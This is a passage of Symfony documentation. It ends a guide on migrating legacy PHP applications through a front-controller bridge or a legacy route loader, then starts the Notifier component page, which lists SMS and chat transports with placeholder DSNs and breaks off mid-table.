Symfony\nrelease you aim to use requires PHP 7.1 and your existing application\ndoes not yet support this PHP version, you will probably have to upgrade\nyour legacy project. Use the ``check:requirements`` command to check if your\nserver meets the :ref:`technical requirements for running Symfony applications <symfony-tech-requirements>`\nand compare them with your current application's environment to make sure you\nare able to run both applications on the same system. Having a test\nsystem, that is as close to the production environment as possible,\nwhere you can just install a new Symfony project next to the existing one\nand check if it is working will give you an even more reliable result.\n\n.. tip::\n\n    If your current project is running on an older PHP version such as\n    PHP 5.x upgrading to a recent version will give you a performance\n    boost without having to change your code.\n\nSetting up Composer\n~~~~~~~~~~~~~~~~~~~\n\nAnother point you will have to look out for is conflicts between\ndependencies in both applications. This is especially important if your\nexisting application already uses Symfony components or libraries commonly\nused in Symfony applications such as Doctrine ORM or Twig.\nA good way for ensuring compatibility is to use the same ``composer.json``\nfor both project's dependencies.\n\nOnce you have introduced composer for managing your project's dependencies\nyou can use its autoloader to ensure you do not run into any conflicts due\nto custom autoloading from your existing framework. This usually entails\nadding an `autoload`_-section to your ``composer.json`` and configuring it\nbased on your application and replacing your custom logic with something\nlike this::\n\n    require __DIR__.'/vendor/autoload.php';\n\nRemoving Global State from the Legacy Application\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn older PHP applications it was quite common to rely on global state and\neven mutate it during runtime. This might have side effects on the newly\nintroduced Symfony application. In other words code relying on globals\nin the existing application should be refactored to allow for both systems\nto work simultaneously. Since relying on global state is considered an\nanti-pattern nowadays you might want to start working on this even before\ndoing any integration.\n\nSetting up the Environment\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere might be additional steps you need to take depending on the libraries\nyou use, the original framework your project is based on and most importantly\nthe age of the project as PHP itself underwent many improvements throughout\nthe years that your code might not have caught on to, yet. As long as both\nyour existing code and a new Symfony project can run in parallel on the\nsame system you are on a good way. All these steps do not require you to\nintroduce Symfony just yet and will already open up some opportunities for\nmodernizing your existing code.\n\nEstablishing a Safety Net for Regressions\n-----------------------------------------\n\nBefore you can safely make changes to the existing code, you must ensure that\nnothing will break. One reason for choosing to migrate is making sure that the\napplication is in a state where it can run at all times. The best way for\nensuring a working state is to establish automated tests.\n\nIt is quite common for an existing application to either not have a test suite\nat all or have low code coverage. Introducing unit tests for this code is\nlikely not cost effective as the old code might be replaced with functionality\nfrom Symfony components or might be adapted to the new application.\nAdditionally legacy code tends to be hard to write tests for, making the process\nslow and cumbersome.\n\nInstead of providing low level tests, that ensure each class works as expected, it\nmight makes sense to write high level tests ensuring that at least anything user\nfacing works on at least a superficial level. These kinds of tests are commonly\ncalled End-to-End tests, because they cover the whole application from what the\nuser sees in the browser down to the very code that is being run and connected\nservices like a database. To automate this you have to make sure that you can\nget a test instance of your system running as easily as possible and making\nsure that external systems do not change your production environment, e.g.\nprovide a separate test database with (anonymized) data from a production\nsystem or being able to setup a new schema with a basic dataset for your test\nenvironment. Since these tests do not rely as much on isolating testable code\nand instead look at the interconnected system, writing them is usually easier\nand more productive when doing a migration. You can then limit your effort on\nwriting lower level tests on parts of the code that you have to change or\nreplace in the new application making sure it is testable right from the start.\n\nThere are tools aimed at End-to-End testing you can use such as\n`Symfony Panther`_ or you can write :doc:`functional tests </testing>`\nin the new Symfony application as soon as the initial setup is completed.\nFor example you can add so called Smoke Tests, which only ensure a certain\npath is accessible by checking the HTTP status code returned or looking for\na text snippet from the page.\n\nIntroducing Symfony to the Existing Application\n-----------------------------------------------\n\nThe following instructions only provide an outline of common tasks for\nsetting up a Symfony application that falls back to a legacy application\nwhenever a route is not accessible. Your mileage may vary and likely you\nwill need to adjust some of this or even provide additional configuration\nor retrofitting to make it work with your application. This guide is not\nsupposed to be comprehensive and instead aims to be a starting point.\n\n.. tip::\n\n    If you get stuck or need additional help you can reach out to the\n    :doc:`Symfony community </contributing/community/index>` whenever you need\n    concrete feedback on an issue you are facing.\n\nBooting Symfony in a Front Controller\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen looking at how a typical PHP application is bootstrapped there are\ntwo major approaches. Nowadays most frameworks provide a so called\nfront controller which acts as an entrypoint. No matter which URL-path\nin your application you are going to, every request is being sent to\nthis front controller, which then determines which parts of your\napplication to load, e.g. which controller and action to call. This is\nalso the approach that Symfony takes with ``public/index.php`` being\nthe front controller. Especially in older applications it was common\nthat different paths were handled by different PHP files.\n\nIn any case you have to create a ``public/index.php`` that will start\nyour Symfony application by either copying the file from the\n``FrameworkBundle``-recipe or by using Flex and requiring the\nFrameworkBundle. You will also likely have to update your web server\n(e.g. Apache or nginx) to always use this front controller. You can\nlook at :doc:`Web Server Configuration </setup/web_server_configuration>`\nfor examples on how this might look. For example when using Apache you can\nuse Rewrite Rules to ensure PHP files are ignored and instead only index.php\nis called:\n\n.. code-block:: apache\n\n    RewriteEngine On\n\n    RewriteCond %{REQUEST_URI}::$1 ^(/.+)/(.*)::\\2$\n    RewriteRule ^(.*) - [E=BASE:%1]\n\n    RewriteCond %{ENV:REDIRECT_STATUS} ^$\n    RewriteRule ^index\\.php(?:/(.*)|$) %{ENV:BASE}/$1 [R=301,L]\n\n    RewriteRule ^index\\.php - [L]\n\n    RewriteCond %{REQUEST_FILENAME} -f\n    RewriteCond %{REQUEST_FILENAME} !^.+\\.php$\n    RewriteRule ^ - [L]\n\n    RewriteRule ^ %{ENV:BASE}/index.php [L]\n\nThis change will make sure that from now on your Symfony application is\nthe first one handling all requests. The next step is to make sure that\nyour existing application is started and taking over whenever Symfony\ncan not yet handle a path previously managed by the existing application.\n\nFrom this point, many tactics are possible and every project requires its\nunique approach for migration. This guide shows two examples of commonly used\napproaches, which you can use as a base for your own approach:\n\n* `Front Controller with Legacy Bridge`_, which leaves the legacy application\n  untouched and allows migrating it in phases to the Symfony application.\n* `Legacy Route Loader`_, where the legacy application is integrated in phases\n  into Symfony, with a fully integrated final result.\n\nFront Controller with Legacy Bridge\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOnce you have a running Symfony application that takes over all requests,\nfalling back to your legacy application is done by extending the original front\ncontroller script with some logic for going to your legacy system. The file\ncould look something like this::\n\n    // public/index.php\n    use App\\Kernel;\n    use App\\LegacyBridge;\n    use Symfony\\Component\\Dotenv\\Dotenv;\n    use Symfony\\Component\\ErrorHandler\\Debug;\n    use Symfony\\Component\\HttpFoundation\\Request;\n\n    require dirname(__DIR__).'/vendor/autoload.php';\n\n    (new Dotenv())->bootEnv(dirname(__DIR__).'/.env');\n\n    /*\n     * The kernel will always be available globally, allowing you to\n     * access it from your existing application and through it the\n     * service container. This allows for introducing new features in\n     * the existing application.\n     */\n    global $kernel;\n\n    if ($_SERVER['APP_DEBUG']) {\n        umask(0000);\n\n        Debug::enable();\n    }\n\n    if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {\n        Request::setTrustedProxies(\n          explode(',', $trustedProxies),\n          Request::HEADER_X_FORWARDED_FOR | Request::HEADER_X_FORWARDED_PORT | Request::HEADER_X_FORWARDED_PROTO\n        );\n    }\n\n    if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {\n        Request::setTrustedHosts([$trustedHosts]);\n    }\n\n    $kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);\n    $request = Request::createFromGlobals();\n    $response = $kernel->handle($request);\n\n    if (false === $response->isNotFound()) {\n        // Symfony successfully handled the route.\n        $response->send();\n    } else {\n        LegacyBridge::handleRequest($request, $response, __DIR__);\n    }\n\n    $kernel->terminate($request, $response);\n\nThere are 2 major deviations from the original file:\n\nLine 18\n  First of all, ``$kernel`` is made globally available. This allows you to use\n  Symfony features inside your existing application and gives access to\n  services configured in our Symfony application. This helps you prepare your\n  own code to work better within the Symfony application before you transition\n  it over. For instance, by replacing outdated or redundant libraries with\n  Symfony components.\n\nLine 41 - 46\n  If Symfony handled the response, it is sent; otherwise, the ``LegacyBridge``\n  handles the request.\n\nThis legacy bridge is responsible for figuring out which file should be loaded\nin order to process the old application logic. This can either be a front\ncontroller similar to Symfony's ``public/index.php`` or a specific script file\nbased on the current route. The basic outline of this LegacyBridge could look\nsomewhat like this::\n\n    // src/LegacyBridge.php\n    namespace App;\n\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class LegacyBridge\n    {\n\n        /**\n         * Map the incoming request to the right file. This is the\n         * key function of the LegacyBridge.\n         *\n         * Sample code only. Your implementation will vary, depending on the\n         * architecture of the legacy code and how it's executed.\n         *\n         * If your mapping is complicated, you may want to write unit tests\n         * to verify your logic, hence this is public static.\n         */\n        public static function getLegacyScript(Request $request): string\n        {\n            $requestPathInfo = $request->getPathInfo();\n            $legacyRoot = __DIR__ . '/../';\n\n            // Map a route to a legacy script:\n            if ($requestPathInfo == '/customer/') {\n                return \"{$legacyRoot}src/customers/list.php\";\n            }\n\n            // Map a direct file call, e.g. an ajax call:\n            if ($requestPathInfo == 'inc/ajax_cust_details.php') {\n                return \"{$legacyRoot}inc/ajax_cust_details.php\";\n            }\n\n            // ... etc.\n\n            throw new \\Exception(\"Unhandled legacy mapping for $requestPathInfo\");\n        }\n\n        public static function handleRequest(Request $request, Response $response, string $publicDirectory): void\n        {\n            $legacyScriptFilename = LegacyBridge::getLegacyScript($request);\n\n            // Possibly (re-)set some env vars (e.g. to handle forms\n            // posting to PHP_SELF):\n            $p = $request->getPathInfo();\n            $_SERVER['PHP_SELF'] = $p;\n            $_SERVER['SCRIPT_NAME'] = $p;\n            $_SERVER['SCRIPT_FILENAME'] = $legacyScriptFilename;\n\n            require $legacyScriptFilename;\n        }\n    }\n\nThis is the most generic approach you can take, that is likely to work\nno matter what your previous system was. You might have to account for\ncertain \"quirks\", but since your original application is only started\nafter Symfony finished handling the request you reduced the chances\nfor side effects and any interference.\n\nSince the old script is called in the global variable scope it will reduce side\neffects on the old code which can sometimes require variables from the global\nscope. At the same time, because your Symfony application will always be\nbooted first, you can access the container via the ``$kernel`` variable and\nthen fetch any service (using :method:`Symfony\\\\Component\\\\HttpKernel\\\\KernelInterface::getContainer`).\nThis can be helpful if you want to introduce new features to your legacy\napplication, without switching over the whole action to the new application.\nFor example, you could now use the Symfony Translator in your old application\nor instead of using your old database logic, you could use Doctrine to refactor\nold queries. This will also allow you to incrementally improve the legacy code\nmaking it easier to transition it over to the new Symfony application.\n\nThe major downside is, that both systems are not well integrated\ninto each other leading to some redundancies and possibly duplicated code.\nFor example, since the Symfony application is already done handling the\nrequest you can not take advantage of kernel events or utilize Symfony's\nrouting for determining which legacy script to call.\n\nLegacy Route Loader\n~~~~~~~~~~~~~~~~~~~\n\nThe major difference to the LegacyBridge-approach from before is, that the\nlogic is moved inside the Symfony application. It removes some of the\nredundancies and allows us to also interact with parts of the legacy\napplication from inside Symfony, instead of just the other way around.\n\n.. tip::\n\n    The following route loader is just a generic example that you might\n    have to tweak for your legacy application. You can familiarize\n    yourself with the concepts by reading up on it in :doc:`Routing </routing>`.\n\nThe legacy route loader is :doc:`a custom route loader </routing/custom_route_loader>`.\nThe legacy route loader has a similar functionality as the previous\nLegacyBridge, but it is a service that is registered inside Symfony's Routing\ncomponent::\n\n    // src/Legacy/LegacyRouteLoader.php\n    namespace App\\Legacy;\n\n    use Symfony\\Component\\Config\\Loader\\Loader;\n    use Symfony\\Component\\Routing\\Route;\n    use Symfony\\Component\\Routing\\RouteCollection;\n\n    class LegacyRouteLoader extends Loader\n    {\n        // ...\n\n        public function load($resource, $type = null): RouteCollection\n        {\n            $collection = new RouteCollection();\n            $finder = new Finder();\n            $finder->files()->name('*.php');\n\n            /** @var SplFileInfo $legacyScriptFile */\n            foreach ($finder->in($this->webDir) as $legacyScriptFile) {\n                // This assumes all legacy files use \".php\" as extension\n                $filename = basename($legacyScriptFile->getRelativePathname(), '.php');\n                $routeName = sprintf('app.legacy.%s', str_replace('/', '__', $filename));\n\n                $collection->add($routeName, new Route($legacyScriptFile->getRelativePathname(), [\n                    '_controller' => 'App\\Controller\\LegacyController::loadLegacyScript',\n                    'requestPath' => '/' . $legacyScriptFile->getRelativePathname(),\n                    'legacyScript' => $legacyScriptFile->getPathname(),\n                ]));\n            }\n\n            return $collection;\n        }\n    }\n\nYou will also have to register the loader in your application's\n``routing.yaml`` as described in the documentation for\n:doc:`Custom Route Loaders </routing/custom_route_loader>`.\nDepending on your configuration, you might also have to tag the service with\n``routing.loader``. Afterwards you should be able to see all the legacy routes\nin your route configuration, e.g. when you call the ``debug:router``-command:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:router\n\nIn order to use these routes you will need to create a controller that handles\nthese routes. You might have noticed the ``_controller`` attribute in the\nprevious code example, which tells Symfony which Controller to call whenever it\ntries to access one of our legacy routes. The controller itself can then use the\nother route attributes (i.e. ``requestPath`` and ``legacyScript``) to determine\nwhich script to call and wrap the output in a response class::\n\n    // src/Controller/LegacyController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\StreamedResponse;\n\n    class LegacyController\n    {\n        public function loadLegacyScript(string $requestPath, string $legacyScript): StreamedResponse\n        {\n            return new StreamedResponse(\n                function () use ($requestPath, $legacyScript): void {\n                    $_SERVER['PHP_SELF'] = $requestPath;\n                    $_SERVER['SCRIPT_NAME'] = $requestPath;\n                    $_SERVER['SCRIPT_FILENAME'] = $legacyScript;\n\n                    chdir(dirname($legacyScript));\n\n                    require $legacyScript;\n                }\n            );\n        }\n    }\n\nThis controller will set some server variables that might be needed by\nthe legacy application. This will simulate the legacy script being called\ndirectly, in case it relies on these variables (e.g. when determining\nrelative paths or file names). Finally the action requires the old script,\nwhich essentially calls the original script as before, but it runs inside\nour current application scope, instead of the global scope.\n\nThere are some risks to this approach, as it is no longer run in the global\nscope. However, since the legacy code now runs inside a controller action, you gain\naccess to many functionalities from the new Symfony application, including the\nchance to use Symfony's event lifecycle. For instance, this allows you to\ntransition the authentication and authorization of the legacy application over\nto the Symfony application using the Security component and its firewalls.\n\n.. _`Strangler Fig Application`: https://martinfowler.com/bliki/StranglerFigApplication.html\n.. _`autoload`: https://getcomposer.org/doc/04-schema.md#autoload\n.. _`Modernizing with Symfony`: https://youtu.be/YzyiZNY9htQ\n.. _`Symfony Panther`: https://github.com/symfony/panther\n"
        },
        {
          "name": "notifier.rst",
          "type": "blob",
          "size": 54.453125,
          "content": "Creating and Sending Notifications\n==================================\n\nInstallation\n------------\n\nCurrent web applications use many different channels to send messages to\nthe users (e.g. SMS, Slack messages, emails, push notifications, etc.). The\nNotifier component in Symfony is an abstraction on top of all these\nchannels. It provides a dynamic way to manage how the messages are sent.\nGet the Notifier installed using:\n\n.. code-block:: terminal\n\n    $ composer require symfony/notifier\n\n.. _channels-chatters-texters-email-and-browser:\n.. _channels-chatters-texters-email-browser-and-push:\n\nChannels\n--------\n\nChannels refer to the different mediums through which notifications can be delivered.\nThese channels include email, SMS, chat services, push notifications, etc. Each\nchannel can integrate with different providers (e.g. Slack or Twilio SMS) by\nusing transports.\n\nThe notifier component supports the following channels:\n\n* :ref:`SMS channel <notifier-sms-channel>` sends notifications to phones via\n  SMS messages;\n* :ref:`Chat channel <notifier-chat-channel>` sends notifications to chat\n  services like Slack and Telegram;\n* :ref:`Email channel <notifier-email-channel>` integrates the :doc:`Symfony Mailer </mailer>`;\n* Browser channel uses :ref:`flash messages <flash-messages>`.\n* :ref:`Push channel <notifier-push-channel>` sends notifications to phones and browsers via push notifications.\n\n.. _notifier-sms-channel:\n\nSMS Channel\n~~~~~~~~~~~\n\nThe SMS channel uses :class:`Symfony\\\\Component\\\\Notifier\\\\Texter` classes\nto send SMS messages to mobile phones. This feature requires subscribing to\na third-party service that sends SMS messages. Symfony provides integration\nwith a couple popular SMS services:\n\n.. warning::\n\n    If any of the DSN values contains any character considered special in a\n    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must\n    encode them. See `RFC 3986`_ for the full list of reserved characters or use the\n    :phpfunction:`urlencode` function to encode them.\n\n==================  ====================================================================================================================================\nService\n==================  ====================================================================================================================================\n`46elks`_           **Install**: ``composer require symfony/forty-six-elks-notifier`` \\\n                    **DSN**: ``forty-six-elks://API_USERNAME:API_PASSWORD@default?from=FROM`` \\\n                    **Webhook support**: No\n`AllMySms`_         **Install**: ``composer require symfony/all-my-sms-notifier`` \\\n                    **DSN**: ``allmysms://LOGIN:APIKEY@default?from=FROM`` \\\n                    **Webhook support**: No\n`AmazonSns`_        **Install**: ``composer require symfony/amazon-sns-notifier`` \\\n                    **DSN**: ``sns://ACCESS_KEY:SECRET_KEY@default?region=REGION`` \\\n                    **Webhook support**: No\n`Bandwidth`_        **Install**: ``composer require symfony/bandwidth-notifier`` \\\n                    **DSN**: ``bandwidth://USERNAME:PASSWORD@default?from=FROM&account_id=ACCOUNT_ID&application_id=APPLICATION_ID&priority=PRIORITY`` \\\n                    **Webhook support**: No\n`Brevo`_            **Install**: ``composer require symfony/brevo-notifier`` \\\n                    **DSN**: ``brevo://API_KEY@default?sender=SENDER`` \\\n                    **Webhook support**: No\n`Clickatell`_       **Install**: ``composer require symfony/clickatell-notifier`` \\\n                    **DSN**: ``clickatell://ACCESS_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`ContactEveryone`_  **Install**: ``composer require symfony/contact-everyone-notifier`` \\\n                    **DSN**: ``contact-everyone://TOKEN@default?&diffusionname=DIFFUSION_NAME&category=CATEGORY`` \\\n                    **Webhook support**: No\n`Esendex`_          **Install**: ``composer require symfony/esendex-notifier`` \\\n                    **DSN**: ``esendex://USER_NAME:PASSWORD@default?accountreference=ACCOUNT_REFERENCE&from=FROM`` \\\n                    **Webhook support**: No\n`FakeSms`_          **Install**: ``composer require symfony/fake-sms-notifier`` \\\n                    **DSN**: ``fakesms+email://MAILER_SERVICE_ID?to=TO&from=FROM`` or ``fakesms+logger://default`` \\\n                    **Webhook support**: No\n`FreeMobile`_       **Install**: ``composer require symfony/free-mobile-notifier`` \\\n                    **DSN**: ``freemobile://LOGIN:API_KEY@default?phone=PHONE`` \\\n                    **Webhook support**: No\n`GatewayApi`_       **Install**: ``composer require symfony/gateway-api-notifier`` \\\n                    **DSN**: ``gatewayapi://TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`GoIP`_             **Install**: ``composer require symfony/go-ip-notifier`` \\\n                    **DSN**: ``goip://USERNAME:PASSWORD@HOST:80?sim_slot=SIM_SLOT`` \\\n                    **Webhook support**: No\n`Infobip`_          **Install**: ``composer require symfony/infobip-notifier`` \\\n                    **DSN**: ``infobip://AUTH_TOKEN@HOST?from=FROM`` \\\n                    **Webhook support**: No\n`Iqsms`_            **Install**: ``composer require symfony/iqsms-notifier`` \\\n                    **DSN**: ``iqsms://LOGIN:PASSWORD@default?from=FROM`` \\\n                    **Webhook support**: No\n`iSendPro`_         **Install**: ``composer require symfony/isendpro-notifier`` \\\n                    **DSN**: ``isendpro://ACCOUNT_KEY_ID@default?from=FROM&no_stop=NO_STOP&sandbox=SANDBOX`` \\\n                    **Webhook support**: No\n`KazInfoTeh`_       **Install**: ``composer require symfony/kaz-info-teh-notifier`` \\\n                    **DSN**: ``kaz-info-teh://USERNAME:PASSWORD@default?sender=FROM`` \\\n                    **Webhook support**: No\n`LightSms`_         **Install**: ``composer require symfony/light-sms-notifier`` \\\n                    **DSN**: ``lightsms://LOGIN:TOKEN@default?from=PHONE`` \\\n                    **Webhook support**: No\n`LOX24`_            **Install**: ``composer require symfony/lox24-notifier`` \\\n                    **DSN**: ``lox24://USER:TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Mailjet`_          **Install**: ``composer require symfony/mailjet-notifier`` \\\n                    **DSN**: ``mailjet://TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`MessageBird`_      **Install**: ``composer require symfony/message-bird-notifier`` \\\n                    **DSN**: ``messagebird://TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`MessageMedia`_     **Install**: ``composer require symfony/message-media-notifier`` \\\n                    **DSN**: ``messagemedia://API_KEY:API_SECRET@default?from=FROM`` \\\n                    **Webhook support**: No\n`Mobyt`_            **Install**: ``composer require symfony/mobyt-notifier`` \\\n                    **DSN**: ``mobyt://USER_KEY:ACCESS_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Nexmo`_            **Install**: ``composer require symfony/nexmo-notifier`` \\\n                    Abandoned in favor of Vonage (see below) \\\n`Octopush`_         **Install**: ``composer require symfony/octopush-notifier`` \\\n                    **DSN**: ``octopush://USERLOGIN:APIKEY@default?from=FROM&type=TYPE`` \\\n                    **Webhook support**: No\n`OrangeSms`_        **Install**: ``composer require symfony/orange-sms-notifier`` \\\n                    **DSN**: ``orange-sms://CLIENT_ID:CLIENT_SECRET@default?from=FROM&sender_name=SENDER_NAME`` \\\n                    **Webhook support**: No\n`OvhCloud`_         **Install**: ``composer require symfony/ovh-cloud-notifier`` \\\n                    **DSN**: ``ovhcloud://APPLICATION_KEY:APPLICATION_SECRET@default?consumer_key=CONSUMER_KEY&service_name=SERVICE_NAME`` \\\n                    **Webhook support**: No\n`Plivo`_            **Install**: ``composer require symfony/plivo-notifier`` \\\n                    **DSN**: ``plivo://AUTH_ID:AUTH_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Redlink`_          **Install**: ``composer require symfony/redlink-notifier`` \\\n                    **DSN**: ``redlink://API_KEY:APP_KEY@default?from=SENDER_NAME&version=API_VERSION`` \\\n                    **Webhook support**: No\n`RingCentral`_      **Install**: ``composer require symfony/ring-central-notifier`` \\\n                    **DSN**: ``ringcentral://API_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Sendberry`_        **Install**: ``composer require symfony/sendberry-notifier`` \\\n                    **DSN**: ``sendberry://USERNAME:PASSWORD@default?auth_key=AUTH_KEY&from=FROM`` \\\n                    **Webhook support**: No\n`Sendinblue`_       **Install**: ``composer require symfony/sendinblue-notifier`` \\\n                    **DSN**: ``sendinblue://API_KEY@default?sender=PHONE`` \\\n                    **Webhook support**: No\n`Sms77`_            **Install**: ``composer require symfony/sms77-notifier`` \\\n                    **DSN**: ``sms77://API_KEY@default?from=FROM`` \\\n                    **Webhook support**: No\n`SimpleTextin`_     **Install**: ``composer require symfony/simple-textin-notifier`` \\\n                    **DSN**: ``simpletextin://API_KEY@default?from=FROM`` \\\n                    **Webhook support**: No\n`Sinch`_            **Install**: ``composer require symfony/sinch-notifier`` \\\n                    **DSN**: ``sinch://ACCOUNT_ID:AUTH_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`SmsSluzba`_        **Install**: ``composer require symfony/sms-sluzba-notifier`` \\\n                    **DSN**: ``sms-sluzba://USERNAME:PASSWORD@default`` \\\n                    **Webhook support**: No\n`Smsapi`_           **Install**: ``composer require symfony/smsapi-notifier`` \\\n                    **DSN**: ``smsapi://TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Smsbox`_           **Install**: ``composer require symfony/smsbox-notifier`` \\\n                    **DSN**: ``smsbox://APIKEY@default?mode=MODE&strategy=STRATEGY&sender=SENDER`` \\\n                    **Webhook support**: No\n`SmsBiuras`_        **Install**: ``composer require symfony/sms-biuras-notifier`` \\\n                    **DSN**: ``smsbiuras://UID:API_KEY@default?from=FROM&test_mode=0`` \\\n                    **Webhook support**: No\n`Smsc`_             **Install**: ``composer require symfony/smsc-notifier`` \\\n                    **DSN**: ``smsc://LOGIN:PASSWORD@default?from=FROM`` \\\n                    **Webhook support**: No\n`SMSense`_          **Install**: ``composer require smsense-notifier`` \\\n                    **DSN**: ``smsense://API_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`SMSFactor`_        **Install**: ``composer require symfony/sms-factor-notifier`` \\\n                    **DSN**: ``sms-factor://TOKEN@default?sender=SENDER&push_type=PUSH_TYPE`` \\\n                    **Webhook support**: No\n`SpotHit`_          **Install**: ``composer require symfony/spot-hit-notifier`` \\\n                    **DSN**: ``spothit://TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Telnyx`_           **Install**: ``composer require symfony/telnyx-notifier`` \\\n                    **DSN**: ``telnyx://API_KEY@default?from=FROM&messaging_profile_id=MESSAGING_PROFILE_ID`` \\\n                    **Webhook support**: No\n`TurboSms`_         **Install**: ``composer require symfony/turbo-sms-notifier`` \\\n                    **DSN**: ``turbosms://AUTH_TOKEN@default?from=FROM`` \\\n                    **Webhook support**: No\n`Twilio`_           **Install**: ``composer require symfony/twilio-notifier`` \\\n                    **DSN**: ``twilio://SID:TOKEN@default?from=FROM`` \\\n                    **Webhook support**: Yes\n`Unifonic`_         **Install**: ``composer require symfony/unifonic-notifier`` \\\n                    **DSN**: ``unifonic://APP_SID@default?from=FROM`` \\\n                    **Webhook support**: No\n`Vonage`_           **Install**: ``composer require symfony/vonage-notifier`` \\\n                    **DSN**: ``vonage://KEY:SECRET@default?from=FROM`` \\\n                    **Webhook support**: Yes\n`Yunpian`_          **Install**: ``composer require symfony/yunpian-notifier`` \\\n                    **DSN**: ``yunpian://APIKEY@default`` \\\n                    **Webhook support**: No\n==================  ====================================================================================================================================\n\n.. tip::\n\n    Use :doc:`Symfony configuration secrets </configuration/secrets>` to securely\n    store your API tokens.\n\n.. tip::\n\n    Some third party transports, when using the API, support status callbacks\n    via webhooks. See the :doc:`Webhook documentation </webhook>` for more\n    details.\n\n.. versionadded:: 7.1\n\n    The ``Smsbox``, ``SmsSluzba``, ``SMSense``, ``LOX24`` and ``Unifonic``\n    integrations were introduced in Symfony 7.1.\n\n.. deprecated:: 7.1\n\n    The `Sms77`_ integration is deprecated since\n    Symfony 7.1, use the `Seven.io`_ integration instead.\n\nTo enable a texter, add the correct DSN in your ``.env`` file and\nconfigure the ``texter_transports``:\n\n.. code-block:: bash\n\n    # .env\n    TWILIO_DSN=twilio://SID:TOKEN@default?from=FROM\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/notifier.yaml\n        framework:\n            notifier:\n                texter_transports:\n                    twilio: '%env(TWILIO_DSN)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/notifier.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:notifier>\n                    <framework:texter-transport name=\"twilio\">\n                        %env(TWILIO_DSN)%\n                    </framework:texter-transport>\n                </framework:notifier>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/notifier.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->notifier()\n                ->texterTransport('twilio', env('TWILIO_DSN'))\n            ;\n        };\n\n.. _sending-sms:\n\nThe :class:`Symfony\\\\Component\\\\Notifier\\\\TexterInterface` class allows you to\nsend SMS messages::\n\n    // src/Controller/SecurityController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Notifier\\Message\\SmsMessage;\n    use Symfony\\Component\\Notifier\\TexterInterface;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class SecurityController\n    {\n        #[Route('/login/success')]\n        public function loginSuccess(TexterInterface $texter): Response\n        {\n            $options = (new ProviderOptions())\n                ->setPriority('high')\n            ;\n\n            $sms = new SmsMessage(\n                // the phone number to send the SMS message to\n                '+1411111111',\n                // the message\n                'A new login was detected!',\n                // optionally, you can override default \"from\" defined in transports\n                '+1422222222',\n                // you can also add options object implementing MessageOptionsInterface\n                $options\n            );\n\n            $sentMessage = $texter->send($sms);\n\n            // ...\n        }\n    }\n\nThe ``send()`` method returns a variable of type\n:class:`Symfony\\\\Component\\\\Notifier\\\\Message\\\\SentMessage` which provides\ninformation such as the message ID and the original message contents.\n\n.. _notifier-chat-channel:\n\nChat Channel\n~~~~~~~~~~~~\n\n.. warning::\n\n    If any of the DSN values contains any character considered special in a\n    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must\n    encode them. See `RFC 3986`_ for the full list of reserved characters or use the\n    :phpfunction:`urlencode` function to encode them.\n\nThe chat channel is used to send chat messages to users by using\n:class:`Symfony\\\\Component\\\\Notifier\\\\Chatter` classes. Symfony provides\nintegration with these chat services:\n\n=======================================  ====================================  =============================================================================\nService                                  Package                               DSN\n=======================================  ====================================  =============================================================================\n`AmazonSns`_                             ``symfony/amazon-sns-notifier``       ``sns://ACCESS_KEY:SECRET_KEY@default?region=REGION``\n`Bluesky`_                               ``symfony/bluesky-notifier``          ``bluesky://USERNAME:PASSWORD@default``\n`Chatwork`_                              ``symfony/chatwork-notifier``         ``chatwork://API_TOKEN@default?room_id=ID``\n`Discord`_                               ``symfony/discord-notifier``          ``discord://TOKEN@default?webhook_id=ID``\n`FakeChat`_                              ``symfony/fake-chat-notifier``        ``fakechat+email://default?to=TO&from=FROM`` or ``fakechat+logger://default``\n`Firebase`_                              ``symfony/firebase-notifier``         ``firebase://USERNAME:PASSWORD@default``\n`Gitter`_                                ``symfony/gitter-notifier``           ``gitter://TOKEN@default?room_id=ROOM_ID``\n`GoogleChat`_                            ``symfony/google-chat-notifier``      